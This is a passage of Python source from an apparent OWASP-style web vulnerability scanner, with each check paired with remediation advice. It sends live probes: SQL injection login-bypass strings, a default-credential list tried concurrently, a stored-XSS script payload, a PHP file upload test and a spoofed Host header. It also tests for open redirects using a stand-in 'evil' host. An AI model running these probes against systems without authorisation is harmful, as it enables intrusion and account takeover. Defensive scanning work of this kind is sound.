                        cwe="CWE-353", cvss="6.8"
                    )

    # ================================================
    #  A04 - CRYPTOGRAPHIC FAILURES
    # ================================================
    def _a04_cryptographic_failures(self, resp):
        print("[A04:2025] Cryptographic Failures...")

        # Plain HTTP
        if self.target.startswith("http://"):
            self._add(
                "A04:2025", "Cryptographic Failures", "HIGH",
                "Unencrypted HTTP Protocol",
                "Site served over HTTP. All data in plaintext - MITM risk.",
                evidence="Protocol: HTTP (no TLS/SSL)",
                fix=(
                    "1. Get free TLS cert: certbot --apache\n"
                    "2. Redirect HTTP->HTTPS\n"
                    "3. Add HSTS header"
                ),
                cwe="CWE-319", cvss="7.5"
            )

        # Insecure cookies
        raw_cookie = resp.headers.get("Set-Cookie", "")
        if raw_cookie:
            issues = []
            if "httponly" not in raw_cookie.lower():
                issues.append("HttpOnly missing - JS can steal cookie")
            if "secure" not in raw_cookie.lower():
                issues.append("Secure missing - sent over plain HTTP")
            if "samesite" not in raw_cookie.lower():
                issues.append("SameSite missing - CSRF possible")
            if issues:
                self._add(
                    "A04:2025", "Cryptographic Failures", "HIGH",
                    "Insecure Cookie Configuration",
                    "Session cookies missing security flags:\n* " + "\n* ".join(issues),
                    evidence=f"Set-Cookie: {raw_cookie[:150]}",
                    fix="Set-Cookie: session=VALUE; HttpOnly; Secure; SameSite=Strict",
                    cwe="CWE-1004", cvss="7.3"
                )

        # JWT analysis
        jwt_re = re.compile(
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
        )
        text_to_search = resp.text + str(dict(resp.headers))
        m = jwt_re.search(text_to_search)
        if m:
            token = m.group(0)
            try:
                seg = token.split(".")[0] + "=" * (4 - len(token.split(".")[0]) % 4)
                hdr = json.loads(base64.urlsafe_b64decode(seg))
                alg = hdr.get("alg", "")
                if alg.lower() == "none":
                    self._add(
                        "A04:2025", "Cryptographic Failures", "CRITICAL",
                        "JWT Algorithm:None - Signature Bypass",
                        "JWT with alg:none - signature verification disabled. "
                        "Attacker can forge admin tokens.",
                        evidence=f"JWT header: {hdr}",
                        fix=(
                            "1. Reject tokens with alg:none.\n"
                            "2. Enforce RS256/HS256 server-side whitelist."
                        ),
                        cwe="CWE-347", cvss="9.8"
                    )
                elif alg in ("HS256", "HS384", "HS512"):
                    self._add(
                        "A04:2025", "Cryptographic Failures", "LOW",
                        f"JWT Symmetric Algorithm ({alg})",
                        f"JWT uses {alg}. Weak secrets brute-forceable with hashcat.",
                        evidence=f"JWT alg: {alg}",
                        fix="Use RS256 (asymmetric) for public APIs.",
                        cwe="CWE-327", cvss="5.3"
                    )
            except Exception:
                pass

        # Sensitive data in URL
        sensitive_params = [
            "password", "passwd", "token", "secret",
            "api_key", "apikey", "auth", "credit_card",
        ]
        for p in sensitive_params:
            if f"{p}=" in self.target.lower():
                self._add(
                    "A04:2025", "Cryptographic Failures", "HIGH",
                    f"Sensitive Data in URL ({p})",
                    f"Parameter '{p}' in URL - logged in server logs and browser history.",
                    evidence=f"URL contains: {p}=...",
                    fix="Never pass sensitive data in URL params. Use POST body + HTTPS.",
                    cwe="CWE-312", cvss="7.5"
                )
                break

    # ================================================
    #  A05 - INJECTION (SQLi / XSS / Cmd / SSTI)
    # ================================================
    def _a05_injection(self, resp):
        print("[A05:2025] Injection...")

        params_to_test = list(set([
            "id", "user", "username", "q", "search", "query",
            "page", "cat", "category", "item", "product",
            "order", "sort", "filter", "key", "name",
        ]) | self.discovered_params)

        # ?? SQL Injection (error-based) ??????????????????????????
        found_sqli = False
        for form in self.discovered_forms:
            if found_sqli: break
            if form["method"] == "POST":
                action_url = form["action"]
                if action_url.startswith("/"):
                    action_url = self.base + action_url
                elif not action_url.startswith("http"):
                    action_url = self.base + "/" + action_url
                for payload, pname in SQLI_ERROR_PAYLOADS:
                    if found_sqli: break
                    for param in form["params"]:
                        data = {p: "test" for p in form["params"]}
                        data[param] = payload
                        r = self._post(action_url, data=data)
                        if r and any(e in r.text.lower() for e in DB_ERRORS):
                            self._add(
                                "A05:2025", "Injection", "CRITICAL",
                                f"SQL Injection (POST) - {form['action']}",
                                f"SQLi via POST param '{param}' at {form['action']}.",
                                evidence=f"POST {form['action']} | {param}={payload} -> DB Error",
                                fix="Use parameterized queries. Never concatenate user input into SQL.",
                                cwe="CWE-89", cvss="9.8", sans="SANS #3"
                            )
                            found_sqli = True
                            break

        for payload, pname in SQLI_ERROR_PAYLOADS:
            if found_sqli: break
            for param in params_to_test:
                url = self._build_url(params={param: payload})
                r = self._get(url)
                if r and any(e in r.text.lower() for e in DB_ERRORS):
                    self._add(
                        "A05:2025", "Injection", "CRITICAL",
                        "SQL Injection (Error-Based)",
                        f"SQLi via '{param}'. DB error in response. "
                        "Full DB extraction and auth bypass possible.",
                        evidence=f"?{param}={payload} -> DB error",
                        fix=(
                            "1. Use parameterized queries:\n"
                            "   cursor.execute('SELECT * FROM t WHERE id=?', (uid,))\n"
                            "2. Use ORM (SQLAlchemy, Hibernate).\n"
                            "3. Least-privilege DB accounts.\n"
                            "4. Deploy WAF."
                        ),
                        cwe="CWE-89", cvss="9.8", sans="SANS #3"
                    )
                    found_sqli = True
                    break

        # Login SQLi auth bypass
        if not found_sqli:
            login_paths = ["/login", "/api/login", "/auth", "/signin"]
            sqli_creds = [
                {"email": "' OR 1=1--", "password": "x"},
                {"username": "admin'--", "password": "x"},
                {"login": "' OR '1'='1", "password": "x"},
            ]
            for path in login_paths:
                if found_sqli: break
                for creds in sqli_creds:
                    r = self._post(f"{self.base}{path}", json_data=creds)
                    if r and r.status_code == 200:
                        body = r.text.lower()
                        if any(s in body for s in [
                            "token", "bearer", "success", "welcome", "dashboard",
                        ]):
                            self._add(
                                "A05:2025", "Injection", "CRITICAL",
                                "SQL Injection - Auth Bypass",
                                f"Login at {path} bypassed via SQLi.",
                                evidence=f"POST {path} -> 200 + auth token",
                                fix="Parameterized queries. Hash passwords with bcrypt/argon2.",
                                cwe="CWE-89", cvss="9.8", sans="SANS #3"
                            )
                            found_sqli = True
                            break

        # ?? Reflected XSS ???????????????????????????????????????
        xss_paths = [
            "/search", "/", "/index.php", "/query",
            "/find", "/results", "/q", "/s",
        ]
        found_xss = False
        for path in xss_paths:
            if found_xss: break
            for payload in XSS_PAYLOADS[:8]:   # core payloads
                url = self._build_url(
                    path=path if path != "/" else "",
                    params={"q": payload, "search": payload, "query": payload}
                )
                r = self._get(url)
                if r and payload in r.text:
                    self._add(
                        "A05:2025", "Injection", "HIGH",
                        "Reflected Cross-Site Scripting (XSS)",
                        f"XSS at {path} - input reflected unencoded. "
                        "Cookie theft, session hijacking, malware delivery.",
                        evidence=f"Path: {path} | Payload reflected: {payload[:60]}",
                        fix=(
                            "1. HTML-encode ALL user output:\n"
                            "   Python: markupsafe.escape()\n"
                            "   PHP: htmlspecialchars($x, ENT_QUOTES)\n"
                            "2. Implement strict Content-Security-Policy.\n"
                            "3. Use auto-escaping template engines."
                        ),
                        cwe="CWE-79", cvss="7.4", sans="SANS #2"
                    )
                    found_xss = True
                    break

        # ?? Command Injection ???????????????????????????????????
        cmd_params = [
            "host", "ip", "cmd", "exec", "ping", "query",
            "file", "path", "dir", "command", "run", "shell",
        ]
        for payload, pname in CMD_PAYLOADS:
            found = False
            for param in cmd_params:
                url = self._build_url(params={param: payload})
                r = self._get(url)
                if r and any(s in r.text for s in CMD_SIGNS):
                    self._add(
                        "A05:2025", "Injection", "CRITICAL",
                        "OS Command Injection",
                        f"Command injection via '{param}'. OS output in response.",
                        evidence=f"?{param}={payload} -> command output",
                        fix=(
                            "NEVER pass user input to OS commands.\n"
                            "Use subprocess with shell=False.\n"
                            "Apply strict input whitelist."
                        ),
                        cwe="CWE-78", cvss="10.0", sans="SANS #5"
                    )
                    found = True
                    break
            if found: break

        # ?? SSTI ????????????????????????????????????????????????
        try:
            baseline = self.session.get(self.target, timeout=8).text
            ssti_unreliable = "49" in baseline
        except Exception:
            ssti_unreliable = False

        if not ssti_unreliable:
            for payload, expected in SSTI_PAYLOADS.items():
                url = self._build_url(params={"q": payload, "name": payload, "msg": payload})
                r = self._get(url)
                if r and expected in r.text:
                    self._add(
                        "A05:2025", "Injection", "CRITICAL",
                        "Server-Side Template Injection (SSTI)",
                        f"Template expression evaluated server-side. "
                        f"RCE achievable in Jinja2/Twig/Freemarker/Smarty/Mako/Velocity.",
                        evidence=f"Payload: {payload} -> Result: {expected}",
                        fix=(
                            "Never render user input as template code.\n"
                            "Use sandboxed template environments.\n"
                            "Validate all inputs before template rendering."
                        ),
                        cwe="CWE-94", cvss="10.0"
                    )
                    break

        # ?? LDAP Injection ??????????????????????????????????????
        ldap_payloads = ["*)(uid=*))(|(uid=*", "*()|%26'", "admin)(&)"]
        ldap_errors   = ["ldap", "javax.naming", "ldapexception", "invalid dn"]
        for payload in ldap_payloads:
            for param in ["user", "username", "email", "login"]:
                url = self._build_url(params={param: payload})
                r = self._get(url)
                if r and any(e in r.text.lower() for e in ldap_errors):
                    self._add(
                        "A05:2025", "Injection", "HIGH",
                        "LDAP Injection",
                        f"LDAP injection via '{param}'. Directory auth bypass possible.",
                        evidence=f"?{param}={payload} -> LDAP error",
                        fix="Escape LDAP special chars: ( ) * \\ NUL / @ = + < > , ;",
                        cwe="CWE-90", cvss="8.1"
                    )
                    break

    # ================================================
    #  A06 - INSECURE DESIGN
    # ================================================
    def _a06_insecure_design(self, resp):
        print("[A06:2025] Insecure Design...")

        login_path = None
        for path in ["/login", "/api/login", "/rest/user/login", "/signin"]:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code in [200, 405]:
                login_path = path
                break

        if login_path:
            blocked = False
            for i in range(12):
                r = self._post(
                    f"{self.base}{login_path}",
                    json_data={"email": f"test{i}@test.com", "password": "Wrong!"}
                )
                if r and r.status_code == 429:
                    blocked = True
                    break
                time.sleep(0.15)

            if not blocked:
                self._add(
                    "A06:2025", "Insecure Design", "HIGH",
                    "No Rate Limiting - Brute Force Risk",
                    f"Login {login_path}: 12 consecutive failures not blocked.",
                    evidence=f"12 requests to {login_path} - no HTTP 429",
                    fix=(
                        "1. Rate limit: max 5 attempts/min.\n"
                        "2. Account lockout after N failures.\n"
                        "3. Add CAPTCHA after 3 failures.\n"
                        "4. Progressive delays."
                    ),
                    cwe="CWE-307", cvss="7.5"
                )

        # User enumeration via password reset
        for path in ["/forgot-password", "/reset-password", "/password/reset"]:
            r1 = self._post(f"{self.base}{path}", json_data={"email": "admin@test.com"})
            r2 = self._post(f"{self.base}{path}", json_data={"email": "notexist_xyz@nowhere.io"})
            if (r1 and r2 and r1.status_code == r2.status_code and
                    abs(len(r1.text) - len(r2.text)) > 10):
                self._add(
                    "A06:2025", "Insecure Design", "MEDIUM",
                    "User Enumeration via Password Reset",
                    f"Password reset at {path} returns different responses for valid vs invalid emails.",
                    evidence=f"Valid: {len(r1.text)}b | Invalid: {len(r2.text)}b",
                    fix='Return identical response: "If this email exists, you will receive a link."',
                    cwe="CWE-204", cvss="5.3"
                )
                break

    # ================================================
    #  A07 - AUTHENTICATION FAILURES
    # ================================================
    def _a07_auth_failures(self, resp):
        print("[A07:2025] Authentication Failures...")

        default_creds = [
            ("admin","admin"), ("admin","password"), ("admin","123456"),
            ("admin","admin123"), ("admin",""), ("root","root"),
            ("test","test"), ("guest","guest"), ("demo","demo"),
            ("admin","letmein"), ("admin","qwerty"), ("admin","welcome"),
        ]
        login_paths = ["/login", "/api/login", "/rest/user/login", "/signin"]

        found_default = False

        def check_auth(params):
            path, (uname, passwd) = params
            for payload in [
                {"username": uname, "password": passwd},
                {"email": f"{uname}@example.com", "password": passwd},
                {"login": uname, "password": passwd},
            ]:
                try:
                    r = self._post(f"{self.base}{path}", json_data=payload)
                    if r and r.status_code == 200:
                        body = r.text.lower()
                        if any(s in body for s in [
                            "token", "bearer", "access_token",
                            "success", "dashboard", "welcome",
                        ]):
                            return (path, uname, passwd)
                except Exception:
                    pass
            return None

        auth_tasks = [(path, cred) for path in login_paths for cred in default_creds]

        # Use as_completed so we can stop after first hit
        cancel_flag = threading.Event()
        with ThreadPoolExecutor(max_workers=10) as ex:
            future_map = {ex.submit(check_auth, t): t for t in auth_tasks}
            for future in as_completed(future_map):
                if cancel_flag.is_set():
                    break
                result = future.result()
                if result and not found_default:
                    path, uname, passwd = result
                    self._add(
                        "A07:2025", "Authentication Failures", "CRITICAL",
                        "Default Credentials Accepted",
                        f"Application accepted {uname}:{passwd} at {path}.",
                        evidence=f"POST {path} {uname}:{passwd} -> 200",
                        fix="Remove default credentials. Enforce strong password policy. Add MFA.",
                        cwe="CWE-521", cvss="9.8"
                    )
                    found_default = True
                    cancel_flag.set()

        # Weak session tokens
        for name, value in resp.cookies.items():
            if any(k in name.lower() for k in ["session","sess","auth","token","sid"]):
                if (len(value) < 16 or value.isdigit() or value.isalpha() or
                        value in ["1","true","admin","user","test"]):
                    self._add(
                        "A07:2025", "Authentication Failures", "HIGH",
                        f"Weak Session Token: {name}",
                        f"Session token '{name}' appears weak/predictable.",
                        evidence=f"{name}={value[:30]}",
                        fix="Use cryptographically secure random tokens (256+ bits).",
                        cvss="7.5"
                    )

    # ================================================
    #  A08 - INTEGRITY FAILURES
    # ================================================
    def _a08_integrity_failures(self, resp):
        print("[A08:2025] Integrity Failures...")

        deser_headers = [
            "application/x-java-serialized-object",
            "application/x-php-serialized",
        ]
        ct = resp.headers.get("Content-Type", "")
        for dh in deser_headers:
            if dh in ct.lower():
                self._add(
                    "A08:2025", "Software and Data Integrity Failures", "HIGH",
                    "Insecure Deserialization Risk",
                    "Response uses serialization format vulnerable to deserialization attacks.",
                    evidence=f"Content-Type: {ct}",
                    fix=(
                        "Use safe data formats (JSON, XML).\n"
                        "Implement integrity checks on serialized objects."
                    ),
                    cwe="CWE-502", cvss="9.8", sans="SANS #24"
                )

    # ================================================
    #  A09 - LOGGING FAILURES
    # ================================================
    def _a09_logging_failures(self, resp):
        print("[A09:2025] Logging/Monitoring...")

        verbose_signs = [
            "stack trace", "traceback", "at line", "exception in",
            "werkzeug debugger", "django debug", "no such file or directory",
            "undefined method", "undefined variable", "parse error",
        ]
        for path in ["/nonexistent_xyz_cybrain", "/api/nonexistent", "/?id=<script>"]:
            r = self._get(f"{self.base}{path}")
            if r and any(s in r.text.lower() for s in verbose_signs):
                self._add(
                    "A09:2025", "Security Logging and Alerting Failures", "MEDIUM",
                    "Verbose Error Messages",
                    "Stack traces and internal paths exposed in error responses.",
                    evidence=f"Verbose error at {path}",
                    fix=(
                        "Configure custom error pages.\n"
                        "Log errors server-side only.\n"
                        "Never expose stack traces to users."
                    ),
                    cwe="CWE-209", cvss="5.3"
                )
                break

        # Exposed log files
        for path in ["/logs/access.log", "/logs/error.log", "/error.log", "/debug.log"]:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200 and len(r.text) > 200:
                body = r.text.lower()
                is_spa = any(s in body for s in ["<!doctype html","<html","bundle.js"])
                is_log = any(s in body for s in ["error","exception","get /","post /","http/1"])
                if is_log and not is_spa:
                    self._add(
                        "A09:2025", "Security Logging and Alerting Failures", "HIGH",
                        f"Log File Exposed: {path}",
                        f"Log at {path} publicly accessible. May contain credentials.",
                        evidence=f"GET {self.base}{path} -> 200 ({len(r.text)}b)",
                        fix="Move logs outside web root. Block via .htaccess.",
                        cwe="CWE-532", cvss="7.5"
                    )

    # ================================================
    #  A10 - MISHANDLING EXCEPTIONS / SSRF
    # ================================================
    def _a10_mishandling_exceptions(self, resp):
        print("[A10:2025] Exception Handling + SSRF...")

        exception_tests = [
            ("?id=", "'\";<>{}[]|\\"),
            ("?id=", "9" * 5000),
            ("?id=", "%00"),
            ("?id=", "NaN"),
            ("?id=", "undefined"),
            ("?id=", "%gg"),
        ]

        def check_exception(params):
            suffix, payload = params
            url = f"{self.target}{suffix}{payload}"
            try:
                r = self._get(url)
                if r and r.status_code == 500:
                    body = r.text.lower()
                    if any(s in body for s in [
                        "exception","error occurred","unhandled","fatal error","500"
                    ]):
                        return payload
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=8) as ex:
            for result in ex.map(check_exception, exception_tests):
                if result:
                    self._add(
                        "A10:2025", "Mishandling of Exceptional Conditions", "MEDIUM",
                        "Unhandled Exception Exposed",
                        "Application returns unhandled exception details.",
                        evidence=f"Input: {str(result)[:30]} -> HTTP 500",
                        fix="Implement global exception handlers. Log server-side only.",
                        cwe="CWE-755", cvss="5.3"
                    )
                    break

        # SSRF - core
        for param in SSRF_PARAMS[:8]:
            for payload in SSRF_PAYLOADS[:4]:
                url = self._build_url(params={param: payload})
                r = self._get(url)
                if r and any(s in r.text.lower() for s in SSRF_SIGNS):
                    self._add(
                        "A10:2025", "Mishandling of Exceptional Conditions", "CRITICAL",
                        "Server-Side Request Forgery (SSRF)",
                        f"SSRF via '{param}'. Internal network accessible.",
                        evidence=f"?{param}={payload} -> internal data",
                        fix=(
                            "Validate URLs against allowlist.\n"
                            "Block private IP ranges at network level.\n"
                            "Use cloud IMDSv2 with token."
                        ),
                        cwe="CWE-918", cvss="9.8", sans="SANS #25"
                    )
                    return

    # ================================================
    #  CWE / SANS EXTRAS
    # ================================================

    def _cwe_path_traversal(self):
        """CWE-22: Path Traversal / LFI - encoded, double-encoded, null byte."""
        print("[CWE-22] Path Traversal/LFI...")
        params = ["file","path","page","include","template","view","doc","load"]
        for payload in PATH_TRAVERSAL:
            for param in params:
                url = self._build_url(params={param: payload})
                r = self._get(url)
                if r and any(s in r.text for s in TRAVERSAL_SIGNS):
                    self._add(
                        "A05:2025", "Injection", "CRITICAL",
                        "Path Traversal / LFI (CWE-22)",
                        f"Path traversal via '{param}' ({payload[:40]}). "
                        "Filesystem content returned.",
                        evidence=f"?{param}={payload} -> file content",
                        fix=(
                            "Validate paths against strict allowlist.\n"
                            "Use chroot/jail for web process.\n"
                            "Never pass user input to file APIs."
                        ),
                        cwe="CWE-22", cvss="9.1", sans="SANS #6"
                    )
                    return

    def _cwe_xxe(self):
        """CWE-611: XXE - classic + blind OOB."""
        print("[CWE-611] XXE...")
        xml_endpoints = [
            "/api/xml","/xml","/upload","/import","/parse",
            "/process","/api/import","/api/parse",
        ]
        headers = {"Content-Type": "application/xml", "User-Agent": BROWSER_UA}

        for path in xml_endpoints:
            # Classic XXE
            r = self._post(f"{self.base}{path}", data=XXE_CLASSIC.encode(), headers=headers)
            if r and r.status_code == 200 and any(s in r.text for s in XXE_SIGNS):
                self._add(
                    "A05:2025", "Injection", "CRITICAL",
                    "XML External Entity (XXE) - Classic",
                    f"XXE at {path}. File contents returned in response.",
                    evidence=f"POST {path} XXE payload -> /etc/passwd",
                    fix=(
                        "Disable external entities:\n"
                        "lxml: etree.XMLParser(resolve_entities=False)\n"
                        "Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"
                    ),
                    cwe="CWE-611", cvss="9.8", sans="SANS #4"
                )
                return

            # Blind XXE - check for DNS callback indicator in error
            r2 = self._post(f"{self.base}{path}", data=XXE_BLIND.encode(), headers=headers)
            if r2 and r2.status_code in (200, 400, 500):
                body = r2.text.lower()
                if any(s in body for s in ["xml","entity","dtd","parse error"]):
                    self._add(
                        "A05:2025", "Injection", "HIGH",
                        "XML External Entity (XXE) - Blind OOB",
                        f"XML endpoint at {path} processes external entities "
                        "(error indicators present). Blind OOB data exfiltration possible.",
                        evidence=f"POST {path} blind XXE -> XML processing indicator",
                        fix=(
                            "Disable external entity processing entirely.\n"
                            "Use JSON instead of XML where possible."
                        ),
                        cwe="CWE-611", cvss="7.5"
                    )
                    return

    def _cwe_open_redirect(self):
        """CWE-601: Open Redirect."""
        print("[CWE-601] Open Redirect...")
        evil = "https://evil-cybrain-test-2025.com"
        redirect_params = [
            "redirect","url","next","goto","return",
            "return_to","returnUrl","target","destination",
            "forward","continue","redirect_uri","callback",
        ]
        for param in redirect_params:
            url = self._build_url(params={param: evil})
            r = self._get(url)
            if r and r.url.startswith(evil):
                self._add(
                    "A01:2025", "Broken Access Control", "MEDIUM",
                    "Open Redirect (CWE-601)",
                    f"Parameter '{param}' redirects to arbitrary external URL.",
                    evidence=f"?{param}={evil} -> {r.url}",
                    fix=(
                        "Validate redirect URLs against allowlist.\n"
                        "Use relative URLs or internal mapping table only."
                    ),
                    cwe="CWE-601", cvss="6.1"
                )
                return

    def _cwe_clickjacking(self, resp):
        """CWE-1021: Clickjacking."""
        print("[CWE-1021] Clickjacking...")
        xfo = resp.headers.get("X-Frame-Options","")
        csp = resp.headers.get("Content-Security-Policy","")
        if not xfo and "frame-ancestors" not in csp:
            self._add(
                "A02:2025", "Security Misconfiguration", "MEDIUM",
                "Clickjacking Vulnerability (CWE-1021)",
                "Page can be embedded in iframe on any external site.",
                fix="X-Frame-Options: DENY  |  CSP: frame-ancestors 'none'",
                cwe="CWE-1021", cvss="6.1"
            )

    def _cwe_host_header_injection(self):
        """CWE-20: Host Header Injection."""
        print("[CWE-20] Host Header Injection...")
        try:
            r = self.session.get(
                self.target,
                headers={"User-Agent": BROWSER_UA, "Host": "evil-cybrain-test.com"},
                timeout=10, verify=False, allow_redirects=False
            )
            if r and "evil-cybrain-test.com" in r.text:
                self._add(
                    "A02:2025", "Security Misconfiguration", "HIGH",
                    "Host Header Injection",
                    "Attacker-controlled Host header reflected. Password reset poisoning possible.",
                    evidence="Host: evil-cybrain-test.com -> reflected in response",
                    fix=(
                        "Validate Host header against allowed hosts list.\n"
                        "Explicit server_name in Nginx / ServerName in Apache."
                    ),
                    cwe="CWE-20", cvss="6.1"
                )
        except Exception:
            pass

    def _cwe_http_methods(self):
        """Dangerous HTTP methods - TRACE, PUT, DELETE."""
        print("[CWE-16] HTTP Methods...")
        try:
            r = self.session.options(
                self.target, timeout=10, verify=False,
                headers={"User-Agent": BROWSER_UA}
            )
            allowed = (
                r.headers.get("Allow","") + r.headers.get("Public","")
            ).upper()
            dangerous = [m for m in ["TRACE","PUT","DELETE","CONNECT"] if m in allowed]
            if dangerous:
                self._add(
                    "A02:2025", "Security Misconfiguration", "MEDIUM",
                    f"Dangerous HTTP Methods: {', '.join(dangerous)}",
                    f"Methods {', '.join(dangerous)} enabled. "
                    "TRACE -> XST attack. PUT/DELETE -> file manipulation.",
                    evidence=f"OPTIONS -> Allow: {allowed}",
                    fix="LimitExcept GET POST { Require all denied }  |  TraceEnable Off",
                    cwe="CWE-16", cvss="5.8"
                )
        except Exception:
            pass

    def _cwe_unrestricted_upload(self):
        """CWE-434: Unrestricted File Upload."""
        print("[CWE-434] File Upload...")
        upload_paths = [
            "/upload","/api/upload","/file/upload",
            "/media/upload","/image/upload","/avatar",
        ]
        for path in upload_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code in (200, 405):
                try:
                    r2 = self.session.post(
                        f"{self.base}{path}",
                        files={"file": ("test.php", b"<?php echo 'cybrain'; ?>", "application/x-php")},
                        timeout=5, verify=False
                    )
                    if r2 and r2.status_code in (200, 201):
                        if any(s in r2.text.lower() for s in ["success","uploaded",".php","url"]):
                            self._add(
                                "A02:2025", "Security Misconfiguration", "CRITICAL",
                                "Unrestricted File Upload (CWE-434)",
                                f"Upload at {path} accepted .php file. RCE via web shell possible.",
                                evidence=f"POST {path} .php -> {r2.status_code}",
                                fix=(
                                    "Whitelist file extensions.\n"
                                    "Check MIME type server-side.\n"
                                    "Store uploads outside web root.\n"
                                    "Disable script execution in upload directories."
                                ),
                                cwe="CWE-434", cvss="10.0", sans="SANS #12"
                            )
                            return
                except Exception:
                    pass

    def _cwe_insecure_deserialization(self, resp):
        """CWE-502: Insecure Deserialization - signature-based detection."""
        print("[CWE-502] Insecure Deserialization...")

        # Check response body for serialized object magic bytes
        body_bytes = resp.content
        body_text  = resp.text

        # Java serialized object: magic bytes AC ED 00 05 or base64 rO0AB
        if b"\xac\xed\x00\x05" in body_bytes or "rO0AB" in body_text:
            self._add(
                "A08:2025", "Software and Data Integrity Failures", "HIGH",
                "Java Serialized Object in Response (CWE-502)",
                "Response contains Java serialized object magic bytes (AC ED 00 05). "
                "If user-controlled data is deserialized, RCE is possible via "
                "gadget chains (ysoserial payloads).",
                evidence="Magic bytes AC ED 00 05 / base64 rO0AB in response",
                fix=(
                    "1. Avoid Java native serialization for untrusted data.\n"
                    "2. Use JSON/XML with strict schema validation.\n"
                    "3. If unavoidable: implement a deserialization filter "
                    "(ObjectInputFilter in Java 9+).\n"
                    "4. Apply RASP/WAF rules blocking ysoserial payloads."
                ),
                cwe="CWE-502", cvss="9.8", sans="SANS #24"
            )

        # PHP serialized object: O:N: or a:N: patterns
        php_serial_re = re.compile(r'[OaCs]:\d+:["\']')
        if php_serial_re.search(body_text):
            self._add(
                "A08:2025", "Software and Data Integrity Failures", "HIGH",
                "PHP Serialized Object in Response (CWE-502)",
                "Response contains PHP serialized object pattern (O:N:). "
                "PHP object injection via __wakeup / __destruct magic methods.",
                evidence="PHP serialized pattern O:N:... found in response",
                fix=(
                    "1. Never deserialize user-controlled data with unserialize().\n"
                    "2. Use json_decode() instead.\n"
                    "3. If needed, use a safe allowlist: "
                    "unserialize($data, ['allowed_classes' => [MyClass::class]])"
                ),
                cwe="CWE-502", cvss="8.1"
            )

        # .NET ViewState without MAC
        if "__VIEWSTATE" in body_text:
            vs_mac = "__VIEWSTATEGENERATOR" in body_text or "EnableViewStateMac" in body_text
            if not vs_mac:
                self._add(
                    "A08:2025", "Software and Data Integrity Failures", "MEDIUM",
                    ".NET ViewState Without MAC Validation",
                    "ViewState present without verified MAC protection. "
                    "Tampered ViewState can lead to deserialization attacks.",
                    evidence="__VIEWSTATE found without MAC indicators",
                    fix=(
                        "Enable ViewState MAC validation:\n"
                        '<pages enableViewStateMac="true" viewStateEncryptionMode="Always"/>\n'
                        "in Web.config <system.web> section."
                    ),
                    cwe="CWE-502", cvss="6.5"
                )

        # Probe cookie values for serialized patterns
        for name, value in resp.cookies.items():
            try:
                decoded = base64.b64decode(value + "==")
                if b"\xac\xed\x00\x05" in decoded:
                    self._add(
                        "A08:2025", "Software and Data Integrity Failures", "CRITICAL",
                        f"Java Serialized Object in Cookie: {name}",
                        f"Cookie '{name}' contains base64-encoded Java serialized object. "
                        "Modifying this cookie and sending it to the server "
                        "may trigger deserialization RCE.",
                        evidence=f"Cookie {name} decodes to AC ED 00 05...",
                        fix="Never store serialized Java objects in cookies. Use signed JWTs or opaque session IDs.",
                        cwe="CWE-502", cvss="9.8"
                    )
            except Exception:
                pass

    def _dom_xss(self, resp):
        """DOM-based XSS - detect dangerous source->sink patterns in JS."""
        print("[XSS-DOM] DOM XSS Analysis...")
        html = resp.text

        found_sources = [s for s in DOM_SOURCES if s in html]
        found_sinks   = [s for s in DOM_SINKS   if s in html]

        if found_sources and found_sinks:
            self._add(
                "A05:2025", "Injection", "HIGH",
                "DOM-Based XSS (Source->Sink Pattern)",
                "Page JavaScript reads from DOM sources and writes to dangerous sinks. "
                "If user-controlled data flows from source to sink without sanitization, "
                "DOM XSS is exploitable entirely client-side (no server reflection needed).",
                evidence=(
                    f"Sources: {', '.join(found_sources[:3])} | "
                    f"Sinks: {', '.join(found_sinks[:3])}"
                ),
                fix=(
                    "1. Never pass location.hash / location.search directly to innerHTML.\n"
                    "2. Use textContent instead of innerHTML where possible.\n"
                    "3. Sanitize with DOMPurify before any innerHTML assignment.\n"
                    "4. Implement strict Content-Security-Policy."
                ),
                cwe="CWE-79", cvss="6.8"
            )

    def _stored_xss_check(self):
        """Stored XSS - submit payload then retrieve it."""
        print("[XSS-Stored] Stored XSS...")
        marker = "<script>alert('cybrain_stored_xss')</script>"

        # Common stored-XSS entry points
        store_endpoints = [
            ("/api/comments",  {"comment": marker, "name": "cybrain"}),
            ("/api/messages",  {"message": marker, "to": "admin"}),
            ("/api/posts",     {"title": "cybrain", "body": marker}),
            ("/comments",      {"comment": marker}),
            ("/guestbook",     {"entry": marker}),
            ("/api/feedback",  {"feedback": marker}),
            ("/api/reviews",   {"review": marker, "rating": 5}),
            ("/api/profile",   {"bio": marker}),
        ]
        read_endpoints = [
            "/api/comments", "/api/messages", "/api/posts",
            "/comments", "/guestbook", "/api/feedback",
            "/api/reviews", "/api/profile", "/",
        ]

        for path, payload in store_endpoints:
            r = self._post(f"{self.base}{path}", json_data=payload)
            if r and r.status_code in (200, 201):
                # Check if stored and reflected back
                for read_path in read_endpoints:
                    r2 = self._get(f"{self.base}{read_path}")
                    if r2 and marker in r2.text:
                        self._add(
                            "A05:2025", "Injection", "CRITICAL",
                            f"Stored XSS - {path}",
                            f"XSS payload stored at {path} and reflected at {read_path}. "
                            "Affects ALL users viewing this content.",
                            evidence=f"POST {path} payload stored -> GET {read_path} reflects it",
                            fix=(
                                "1. HTML-encode all user-generated content on output.\n"
                                "2. Sanitize on input AND output.\n"
                                "3. Use Content-Security-Policy to block inline scripts."
                            ),
                            cwe="CWE-79", cvss="8.8"
                        )
                        return

    def _csp_bypass_xss(self, resp):
        """XSS via CSP bypass vectors."""
        print("[XSS-CSP] CSP Bypass Analysis...")
        csp = resp.headers.get("Content-Security-Policy","")

        if not csp:
            return  # Already caught in missing headers

        bypass_indicators = []

        # unsafe-inline present
        if "unsafe-inline" in csp:
            bypass_indicators.append("'unsafe-inline' allows direct script injection")

        # unsafe-eval present
        if "unsafe-eval" in csp:
            bypass_indicators.append("'unsafe-eval' allows eval() exploitation")

        # Wildcard script-src
        if re.search(r"script-src[^;]*\*", csp):
            bypass_indicators.append("Wildcard (*) in script-src bypasses CSP origin restriction")

        # data: URI in script-src
        if "data:" in csp and "script-src" in csp:
            bypass_indicators.append("data: URI in script-src allows inline script injection")

        # JSONP endpoints on allowed CDN
